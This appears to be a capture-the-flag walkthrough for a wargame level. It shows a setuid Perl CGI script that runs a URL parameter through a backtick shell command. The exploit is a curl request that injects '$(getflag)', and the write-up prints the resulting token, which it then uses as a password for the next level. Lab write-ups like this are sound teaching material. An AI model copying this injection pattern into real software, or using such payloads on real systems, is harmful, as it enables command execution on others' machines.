## Check files inside home folder of user level04
ls -la

-> -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl

## This file can be execute as flag04 user, in addition is a Perl file with the folowing code
cat level04.pl

```perl
   #!/usr/bin/perl
   # localhost:4747
   use CGI qw{param};
   print "Content-type: text/html\n\n";
   sub x {
     $y = $_[0];
     print `echo $y 2>&1`;
   }
   x(param("x"));
```

## To exploit this file we need use this line
print `echo $y 2>&1`;

## If we use curl with a paramater we can execute any comand and show the results
curl 'localhost:4747/?x=$(getflag)'

->Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

## Log in to user level05
su level05 (password: ne2searoevaevoem4ov4ar8ap)
